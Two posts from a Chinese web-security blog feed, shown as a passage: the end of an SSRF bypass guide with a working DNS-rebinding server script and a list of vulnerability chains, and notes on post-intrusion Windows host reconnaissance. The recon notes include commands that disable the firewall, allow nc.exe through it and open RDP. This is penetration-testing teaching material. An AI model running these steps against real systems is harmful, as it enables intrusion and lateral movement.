title="DNS Rebinding"></a>DNS Rebinding</h3><p>DNS Rebinding可以利用于绕过SSRF以及绕过同源策略等。</p><p>这里看下利用DNS Rebinding绕过SSRF过滤URL参数的场景，有如下三种方法。</p><h4 id="特定域名实现TTL-0"><a href="#特定域名实现TTL-0" class="headerlink" title="特定域名实现TTL=0"></a>特定域名实现TTL=0</h4><p>一个常用的防护思路是：对于用户请求的URL参数，首先服务器端会对其进行DNS解析，然后对于DNS服务器返回的IP地址进行判断，如果在黑名单中，就禁止该次请求。</p><p>但是在整个过程中，第一次去请求DNS服务进行域名解析到第二次服务端去请求URL之间存在一个时间差，利用这个时间差，可以进行DNS重绑定攻击。</p><p>要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，设置TTL时间为0。这样就可以进行攻击了，完整的攻击流程为：</p><ul><li>服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP</li><li>对于获得的IP进行判断，发现为非黑名单IP，则通过验证</li><li>服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。</li><li>由于已经绕过验证，所以服务器端返回访问内网资源的结果。</li></ul><h4 id="域名绑定两条A记录"><a href="#域名绑定两条A记录" class="headerlink" title="域名绑定两条A记录"></a>域名绑定两条A记录</h4><p>四分之一的概率，当第一次解析为外网IP，第二次解析为内网IP，就会成功。</p><p><img src="/2020/02/29/SSRF-Tricks小结/6.png" alt=""></p><h4 id="自建DNS服务器"><a href="#自建DNS服务器" class="headerlink" title="自建DNS服务器"></a>自建DNS服务器</h4><p>先添加一条NS记录和一条A记录：</p><p><img src="/2020/02/29/SSRF-Tricks小结/7.png" alt=""></p><p>Ns记录表示这个子域名test.h0pe.site指定由ns.h0pe.site域名服务器解析，A记录表示ns.h0pe.site位置在ip地址x.x.x.x上。</p><p>在这个IP地址上搭建DNS服务器，采用Python的twisted库的name模块，核心代码如下，以root权限运行即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> twisted.internet <span class="keyword">import</span> reactor, defer</span><br><span class="line"><span class="keyword">from</span> twisted.names <span class="keyword">import</span> client, dns, error, server</span><br><span class="line"></span><br><span class="line">record=&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DynamicResolver</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_doDynamicResponse</span><span class="params">(self, query)</span>:</span></span><br><span class="line">        name = query.name.name</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> record <span class="keyword">or</span> record[name]&lt;<span class="number">1</span>:</span><br><span class="line">            ip=<span class="string">"104.160.43.154"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ip=<span class="string">"171.18.0.2"</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> record:</span><br><span class="line">            record[name]=<span class="number">0</span></span><br><span class="line">        record[name]+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> name+<span class="string">" ===&gt; "</span>+ip</span><br><span class="line"></span><br><span class="line">        answer = dns.RRHeader(</span><br><span class="line">            name=name,</span><br><span class="line">            type=dns.A,</span><br><span class="line">            cls=dns.IN,</span><br><span class="line">            ttl=<span class="number">0</span>,</span><br><span class="line">            payload=dns.Record_A(address=<span class="string">b'%s'</span>%ip,ttl=<span class="number">0</span>)</span><br><span class="line">        )</span><br><span class="line">        answers = [answer]</span><br><span class="line">        authority = []</span><br><span class="line">        additional = []</span><br><span class="line">        <span class="keyword">return</span> answers, authority, additional</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">query</span><span class="params">(self, query, timeout=None)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> defer.succeed(self._doDynamicResponse(query))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    factory = server.DNSServerFactory(</span><br><span class="line">        clients=[DynamicResolver(), client.Resolver(resolv=<span class="string">'/etc/resolv.conf'</span>)]</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    protocol = dns.DNSDatagramProtocol(controller=factory)</span><br><span class="line">    reactor.listenUDP(<span class="number">53</span>, protocol)</span><br><span class="line">    reactor.run()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">raise</span> SystemExit(main())</span><br></pre></td></tr></table></figure><h3 id="通过各种非HTTP协议"><a href="#通过各种非HTTP协议" class="headerlink" title="通过各种非HTTP协议"></a>通过各种非HTTP协议</h3><p>在某些情况下，后台会限制协议类型，如不能使用http/https。</p><p>在前面的SSRF攻击利用中提到过很多协议，如file、dict、gopher等，可以使用这些不在限制协议名单中的协议来绕过利用，具体的还得看后台语言和环境而定。</p><h2 id="0x05-漏洞组合拳"><a href="#0x05-漏洞组合拳" class="headerlink" title="0x05 漏洞组合拳"></a>0x05 漏洞组合拳</h2><h3 id="SSRF-文件解析漏洞"><a href="#SSRF-文件解析漏洞" class="headerlink" title="SSRF+文件解析漏洞"></a>SSRF+文件解析漏洞</h3><p>当某个页面存在SSRF漏洞，但限制了只能加载jpg等图片类型后缀的文件。此时可以结合如Apache解析漏洞，上传一个a.php.jpg的恶意文件，在通过SSRF漏洞来加载执行。</p><h3 id="SSRF-CRLF注入漏洞"><a href="#SSRF-CRLF注入漏洞" class="headerlink" title="SSRF+CRLF注入漏洞"></a>SSRF+CRLF注入漏洞</h3><p>如SSRF in Python中所说。</p><h3 id="SSRF-XXE漏洞"><a href="#SSRF-XXE漏洞" class="headerlink" title="SSRF+XXE漏洞"></a>SSRF+XXE漏洞</h3><p>参考bWAPP中SSRF。</p><h3 id="其他一些漏洞利用组合"><a href="#其他一些漏洞利用组合" class="headerlink" title="其他一些漏洞利用组合"></a>其他一些漏洞利用组合</h3><ul><li>Apache Hadoop远程命令执行</li><li>axis2-admin部署Server命令执行</li><li>Confluence SSRF</li><li>counchdb WEB API远程命令执行</li><li>dict</li><li>docker API远程命令执行</li><li>Elasticsearch引擎Groovy脚本命令执行</li><li>ftp / ftps（FTP爆破）</li><li>glassfish任意文件读取和war文件部署间接命令执行</li><li>gopher</li><li>HFS远程命令执行</li><li>http、https</li><li>imap/imaps/pop3/pop3s/smtp/smtps（爆破邮件用户名密码）</li><li>Java调试接口命令执行</li><li>JBOSS远程Invoker war命令执行</li><li>Jenkins Scripts接口命令执行</li><li>ldap</li><li>mongodb</li><li>php_fpm/fastcgi 命令执行</li><li>rtsp - smb/smbs（连接SMB）</li><li>sftp</li><li>ShellShock命令执行</li><li>Struts2 RCE</li><li>telnet</li><li>tftp（UDP协议扩展）</li><li>tomcat命令执行</li><li>WebDav PUT上传任意文件</li><li>WebSphere Admin可部署war间接命令执行</li><li>zentoPMS远程命令执行</li></ul><h2 id="0x06-防御方法"><a href="#0x06-防御方法" class="headerlink" title="0x06 防御方法"></a>0x06 防御方法</h2><ul><li>限制协议为http/https，禁用不必要的协议；</li><li>尽量禁止30x跳转；</li><li>设置URL白名单或限制内网IP、限制请求的端口等；</li><li>统一错误信息；</li><li>对DNS Rebinding，考虑使用DNS缓存或者Host白名单；</li></ul><h2 id="0x07-参考"><a href="#0x07-参考" class="headerlink" title="0x07 参考"></a>0x07 参考</h2><p><a href="https://joychou.org/web/phpssrf.html" target="_blank" rel="noopener">SSRF in PHP</a></p><p><a href="https://websec.readthedocs.io/zh/latest/vuln/ssrf.html" target="_blank" rel="noopener">Web安全学习笔记-SSRF</a></p><p><a href="http://blog.safebuff.com/2016/07/03/SSRF-Tips/" target="_blank" rel="noopener">SSRF Tips</a></p><p><a href="https://www.t00ls.net/articles-41070.html#" target="_blank" rel="noopener">SSRF漏洞(原理&amp;绕过姿势)</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Web安全基础" scheme="https://www.mi1k7ea.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="SSRF" scheme="https://www.mi1k7ea.com/tags/SSRF/"/>
    
  </entry>
  
  <entry>
    <title>内网信息收集之本机信息收集</title>
    <link href="https://www.mi1k7ea.com/2020/02/27/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8B%E6%9C%AC%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>https://www.mi1k7ea.com/2020/02/27/内网信息收集之本机信息收集/</id>
    <published>2020-02-27T13:49:40.000Z</published>
    <updated>2020-03-08T13:18:45.381Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-参考"><a href="#0x00-参考" class="headerlink" title="0x00 参考"></a>0x00 参考</h2><p>《内网安全攻防》笔记。</p><h2 id="0x01-手动收集信息"><a href="#0x01-手动收集信息" class="headerlink" title="0x01 手动收集信息"></a>0x01 手动收集信息</h2><p>本机信息包括OS、权限、内网IP段、杀软、端口、服务、补丁更新频率、网络连接、共享、会话等。如果是域内主机，OS、应用软件、补丁、服务、杀软这些一般都是批量安装的。</p><h3 id="查询网络配置信息"><a href="#查询网络配置信息" class="headerlink" title="查询网络配置信息"></a>查询网络配置信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure><p>使用该命令可查看IP地址、DNS服务器、主机名、域名等信息：</p><p><img src="/2020/02/27/内网信息收集之本机信息收集/1.png" alt=""></p><h3 id="查询操作系统及软件信息"><a href="#查询操作系统及软件信息" class="headerlink" title="查询操作系统及软件信息"></a>查询操作系统及软件信息</h3><h4 id="查询操作系统名称和版本信息"><a href="#查询操作系统名称和版本信息" class="headerlink" title="查询操作系统名称和版本信息"></a>查询操作系统名称和版本信息</h4><p>分英文版和中文版：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</span><br><span class="line">或</span><br><span class="line">systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/2.png" alt=""></p><h4 id="查看系统体系结构"><a href="#查看系统体系结构" class="headerlink" title="查看系统体系结构"></a>查看系统体系结构</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo %PROCESSOR_ARCHITECTURE%</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/3.png" alt=""></p><h4 id="查看安装的软件及版本、路径等"><a href="#查看安装的软件及版本、路径等" class="headerlink" title="查看安装的软件及版本、路径等"></a>查看安装的软件及版本、路径等</h4><p>利用wmic命令将结果输出到文本文件中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic product get name,version</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/4.png" alt=""></p><p>利用PowerShell命令收集软件的版本信息（当然如果已在PowerShell终端，则直接输入双引号里的命令即可）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell &quot;Get-WmiObject -class Win32_Product |Select-Object -Property name,version&quot;</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/5.png" alt=""></p><h3 id="查询本机服务信息"><a href="#查询本机服务信息" class="headerlink" title="查询本机服务信息"></a>查询本机服务信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service list brief</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/6.png" alt=""></p><h3 id="查询进程列表"><a href="#查询进程列表" class="headerlink" title="查询进程列表"></a>查询进程列表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist</span><br></pre></td></tr></table></figure><p>该命令可以查看当前进程列表和进程用户，分析软件、客户端邮件、VPN和杀毒软件等进程：</p><p><img src="/2020/02/27/内网信息收集之本机信息收集/7.png" alt=""></p><p>如下命令查看进程信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process list brief</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/8.png" alt=""></p><h4 id="常见杀毒软件的进程"><a href="#常见杀毒软件的进程" class="headerlink" title="常见杀毒软件的进程"></a>常见杀毒软件的进程</h4><p>如下表：</p><table><thead><tr><th>进程</th><th>软件名称</th></tr></thead><tbody><tr><td>360SD.EXE</td><td>360杀毒</td></tr><tr><td>360TRAY.EXE</td><td>360实时保护</td></tr><tr><td>ZHUDONGFANGYU.EXE</td><td>360主动防御</td></tr><tr><td>KSAFETRAY.EXE</td><td>金山卫士</td></tr><tr><td>SAFEDOGUPDATECENTER.EXE</td><td>服务器安全狗</td></tr><tr><td>MCAFEE MCSHIELD.EXE</td><td>迈克菲杀毒软件</td></tr><tr><td>EGUI.EXE</td><td>NOD32</td></tr><tr><td>AVP.EXE</td><td>卡巴斯基</td></tr><tr><td>AVGUARD.EXE</td><td>小红伞</td></tr><tr><td>BDAGENT.EXE</td><td>BITDEFENDER</td></tr></tbody></table><h3 id="查询启动程序信息"><a href="#查询启动程序信息" class="headerlink" title="查询启动程序信息"></a>查询启动程序信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic startup get command,caption</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/9.png" alt=""></p><h3 id="查询计划任务"><a href="#查询计划任务" class="headerlink" title="查询计划任务"></a>查询计划任务</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /fo LIST /v</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/10.png" alt=""></p><h3 id="查询主机开机时间"><a href="#查询主机开机时间" class="headerlink" title="查询主机开机时间"></a>查询主机开机时间</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net statistics workstation</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/11.png" alt=""></p><h3 id="查询用户列表"><a href="#查询用户列表" class="headerlink" title="查询用户列表"></a>查询用户列表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/12.png" alt=""></p><p>通过分析本机用户列表，可以得出内网机子的命名规则，特别是个人及其的名称，可以用来推测整个域的用户命名方式。</p><p>通过以下命令获取本地管理员（通常包含域用户）信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure><p>可以看到，本地管理员有两个用户和一个组，默认Domain Admins组中为域内机器的本地管理员用户。在真实环境中，为了方便管理，会有域用户被添加为域机器的本地管理员用户。如图：</p><p><img src="/2020/02/27/内网信息收集之本机信息收集/13.png" alt=""></p><p>执行如下命令查看当前在线用户：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query user || qwinsta</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/14.png" alt=""></p><h3 id="列出或断开本地计算机与所连接的客户端之间的会话"><a href="#列出或断开本地计算机与所连接的客户端之间的会话" class="headerlink" title="列出或断开本地计算机与所连接的客户端之间的会话"></a>列出或断开本地计算机与所连接的客户端之间的会话</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net session</span><br></pre></td></tr></table></figure><h3 id="查询端口列表"><a href="#查询端口列表" class="headerlink" title="查询端口列表"></a>查询端口列表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/15.png" alt=""></p><h3 id="查询补丁列表"><a href="#查询补丁列表" class="headerlink" title="查询补丁列表"></a>查询补丁列表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure><p>需要注意系统的版本、位数、域、补丁信息及更新频率等。域内主机的补丁通常是批量安装的，通过查看本机补丁列表，就可以找到未打补丁的漏洞。</p><p><img src="/2020/02/27/内网信息收集之本机信息收集/16.png" alt=""></p><p>使用wmic命令查看安装在系统中的补丁，包括补丁的名称、描述、ID、安装时间等信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/17.png" alt=""></p><h3 id="查询本机共享列表"><a href="#查询本机共享列表" class="headerlink" title="查询本机共享列表"></a>查询本机共享列表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net share</span><br></pre></td></tr></table></figure><p>该命令可查看本机共享列表和可访问的域共享列表（域共享在很多时候是相同的）：</p><p><img src="/2020/02/27/内网信息收集之本机信息收集/18.png" alt=""></p><p>利用wmic命令查找共享列表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic share get name,path,status</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/19.png" alt=""></p><h3 id="查询路由表及所有可用接口的ARP缓存表"><a href="#查询路由表及所有可用接口的ARP缓存表" class="headerlink" title="查询路由表及所有可用接口的ARP缓存表"></a>查询路由表及所有可用接口的ARP缓存表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">route print</span><br><span class="line">arp -a</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/20.png" alt=""></p><p><img src="/2020/02/27/内网信息收集之本机信息收集/21.png" alt=""></p><h3 id="查询防火墙相关配置"><a href="#查询防火墙相关配置" class="headerlink" title="查询防火墙相关配置"></a>查询防火墙相关配置</h3><h4 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h4><p>Windows Server 2003及之前的版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall set opmode disable</span><br></pre></td></tr></table></figure><p>Windows Server 2003之后的版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure><h4 id="查看防火墙配置"><a href="#查看防火墙配置" class="headerlink" title="查看防火墙配置"></a>查看防火墙配置</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall show config</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/22.png" alt=""></p><h4 id="修改防火墙配置"><a href="#修改防火墙配置" class="headerlink" title="修改防火墙配置"></a>修改防火墙配置</h4><p>Windows Server 2003及之前的版本，允许指定程序全部连接：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall add allowedprogram c:\nc.exe &quot;allow nc&quot; enable</span><br></pre></td></tr></table></figure><p>Windows Server 2003之后的版本，情况如下。</p><p>允许指定程序进入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;C:\nc.exe&quot;</span><br></pre></td></tr></table></figure><p>允许指定程序退出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name=&quot;Allow nc&quot; dir=out action=allow program=&quot;C:\nc.exe&quot;</span><br></pre></td></tr></table></figure><p>允许3389端口放行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br></pre></td></tr></table></figure><h4 id="自定义防火墙日志的储存位置"><a href="#自定义防火墙日志的储存位置" class="headerlink" title="自定义防火墙日志的储存位置"></a>自定义防火墙日志的储存位置</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set currentprofile logging filename &quot;C:\windows\temp\fw.log&quot;</span><br></pre></td></tr></table></figure><h3 id="查询代理配置情况"><a href="#查询代理配置情况" class="headerlink" title="查询代理配置情况"></a>查询代理配置情况</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</span><br></pre></td></tr></table></figure><p>这里我本地是没开代理端口的：</p><p><img src="/2020/02/27/内网信息收集之本机信息收集/24.png" alt=""></p><h3 id="查询并开启远程连接服务"><a href="#查询并开启远程连接服务" class="headerlink" title="查询并开启远程连接服务"></a>查询并开启远程连接服务</h3><h4 id="查看远程连接端口"><a href="#查看远程连接端口" class="headerlink" title="查看远程连接端口"></a>查看远程连接端口</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Reg query &quot;hkey_local_machine\system\currentcontrolset\control\terminal server\winstations\RDP-Tcp&quot; /v portnumber</span><br></pre></td></tr></table></figure><p>在命令行环境中执行注册表查询语句，连接的端口为0xd3d，转换后为3389：</p><p><img src="/2020/02/27/内网信息收集之本机信息收集/23.png" alt=""></p><h4 id="在Windows-Server-2003中开启3389端口"><a href="#在Windows-Server-2003中开启3389端口" class="headerlink" title="在Windows Server 2003中开启3389端口"></a>在Windows Server 2003中开启3389端口</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic path win32_terminalservicesetting where (__CLASS !=&quot;&quot;)  call setallowtsconnections 1</span><br></pre></td></tr></table></figure><h4 id="在Windows-Server-2008和Windows-Server-2012中开启3389端口"><a href="#在Windows-Server-2008和Windows-Server-2012中开启3389端口" class="headerlink" title="在Windows Server 2008和Windows Server 2012中开启3389端口"></a>在Windows Server 2008和Windows Server 2012中开启3389端口</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1</span><br><span class="line"></span><br><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName=&apos;RDP-Tcp&apos;) call setuserauthenticationrequired 1</span><br><span class="line"></span><br><span class="line">reg add &quot;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure><h2 id="0x02-自动收集信息"><a href="#0x02-自动收集信息" class="headerlink" title="0x02 自动收集信息"></a>0x02 自动收集信息</h2><p>为了简化前面手动收集信息的操作，我们可以直接创建一个脚本文件来自动完成前面的信息查询等工作。这里推荐一个使用WMIC收集目标机器信息的脚本。</p><p>WMIC（Windows Management Instrumentation Command-Line，Windows管理工具命令行）是最有用的Windows命令行工具。在默认情况下，任何版本的Windows XP的低权限用户不能访问WMIC，Windows 7以上版本的低权限用户允许访问WMIC并执行相关操作。</p><p>下载地址：<a href="http://www.fuzzysecurity.com/scripts/files/wmic_info.rar" target="_blank" rel="noopener">http://www.fuzzysecurity.com/scripts/files/wmic_info.rar</a></p><p>我们可简单看下它的代码，其实就是执行一些wmic查询命令然后保存到html文件中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">for /f &quot;delims=&quot; %%A in (&apos;dir /s /b %WINDIR%\system32\*htable.xsl&apos;) do set &quot;var=%%A&quot;</span><br><span class="line"></span><br><span class="line">wmic process get CSName,Description,ExecutablePath,ProcessId /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic service get Caption,Name,PathName,ServiceType,Started,StartMode,StartName /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic USERACCOUNT list full /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic group list full /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic nicconfig where IPEnabled=&apos;true&apos; get Caption,DefaultIPGateway,Description,DHCPEnabled,DHCPServer,IPAddress,IPSubnet,MACAddress /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic volume get Label,DeviceID,DriveLetter,FileSystem,Capacity,FreeSpace /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic netuse list full /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic startup get Caption,Command,Location,User /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic PRODUCT get Description,InstallDate,InstallLocation,PackageCache,Vendor,Version /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic os get name,version,InstallDate,LastBootUpTime,LocalDateTime,Manufacturer,RegisteredUser,ServicePackMajorVersion,SystemDirectory /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic Timezone get DaylightName,Description,StandardName /format:&quot;%var%&quot; &gt;&gt; out.html</span><br></pre></td></tr></table></figure><p>执行该脚本后，会在本地生成一个HTML文件来保存结果：</p><p><img src="/2020/02/27/内网信息收集之本机信息收集/25.png" alt=""></p><h2 id="0x03-Empire下的主机信息收集"><a href="#0x03-Empire下的主机信息收集" class="headerlink" title="0x03 Empire下的主机信息收集"></a>0x03 Empire下的主机信息收集</h2><p>Empire是针对Windows系统的后渗透神器，包括了从stager生成、提权到渗透维持的一系列功能。</p><p>官网：<a href="http://www.powershellempire.com/" target="_blank" rel="noopener">http://www.powershellempire.com/</a></p><p>下面只做下笔记，就不自己折腾了。</p><p>Empire提供了用于收集主机信息的模块。输入如下命令即可查看本机用户、域组成员、密码设置时间、剪贴板内容、系统基本信息、网络适配器信息、共享信息等：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usemodule situational_awareness/host/winenum</span><br></pre></td></tr></table></figure><p>此外，situational_awareness/host/computerdetails模块几乎包含了系统中所有有用的信息，比如目标主机事件日志、应用程序控制策略日志，包括RDP登录信息、PowerShell脚本运行和保存的信息等。注意，该模块需要管理员权限运行。</p><h2 id="0x04-查询当前权限"><a href="#0x04-查询当前权限" class="headerlink" title="0x04 